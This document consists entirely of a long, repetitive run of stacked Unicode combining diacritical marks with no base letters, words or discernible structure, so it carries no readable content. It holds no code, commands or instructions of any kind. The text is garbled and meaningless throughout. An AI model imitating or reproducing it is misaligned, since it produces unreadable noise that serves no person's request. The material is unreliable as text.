̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̈́͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̈́͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛